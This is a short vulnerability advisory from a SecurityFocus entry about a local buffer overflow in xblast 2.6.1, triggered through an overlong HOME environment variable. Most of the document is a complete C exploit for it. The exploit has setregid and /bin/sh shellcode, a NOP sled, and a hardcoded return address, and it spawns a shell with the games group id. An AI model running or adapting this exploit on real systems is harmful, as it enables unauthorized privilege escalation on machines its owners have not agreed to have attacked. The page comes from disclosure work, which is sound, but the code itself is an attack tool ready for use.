source: http://www.securityfocus.com/bid/8296/info

XBlast is contains a locally exploitable buffer overflow vulnerability due to insufficient bounds checking of data supplied via the HOME environment variable. Successful exploitation would allow a local user to execute code with a gid of games.

/*  0x333xblast =>  xblast 2.6.1 local exploit
 *
 *	xblast could be overflowed by passing a long $HOME
 *	env. For more info read advisory @ :
 *
 *	http://www.0x333.org/advisories/outsider-003.txt
 *
 *	* note * :
 *	exploit tested against xblast-2.6.beta-1.i386.rpm
 *	under Red Hat Linux 9.0. xblaste is not install
 *	by default +s.
 *
 *	coded by c0wboy
 *
 *  (c) 0x333 Outsider Security Labs / www.0x333.org
 *
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>


#define BIN 	"/usr/X11R6/bin/xblast"
#define SIZE	1032

#define RET		0xbffffb38
#define NOP		0x90


unsigned char shellcode[] =

	/* setregid (20,20) shellcode */
	"\x31\xc0\x31\xdb\x31\xc9\xb3\x14\xb1\x14\xb0\x47"
	"\xcd\x80"

	/* exec /bin/sh shellcode */

	"\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62"
	"\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";


void banner (void);
void memret (char *, int, int, int);


void banner (void)
{
	fprintf (stdout, "\n\n ---       xblast local exploit by c0wboy      ---\n");
	fprintf (stdout, " --- Outsiders Se(c)urity Labs / www.0x333.org ---\n\n");

	fprintf (stdout, " [NOW PRESS 'y' TO SPAWN THE SHELL]\n\n");
}


void memret (char *buffer, int ret, int size, int align)
{
        int i;
        int * ptr = (int *) (buffer + align);
                                                                                
        for (i=0; i<size; i+=4)
                *ptr++ = ret;
                                                                                
        ptr = 0x0;
}


int main ()
{
	int ret = RET;
	char out[SIZE];

	memret ((char *)out, ret, SIZE-1, 0);

	memset ((char *)out, NOP, 333);
	memcpy ((char *)out+333, shellcode, strlen(shellcode));

	setenv ("HOME", out, 1);

	banner ();
	execl (BIN, BIN, 0x0);
}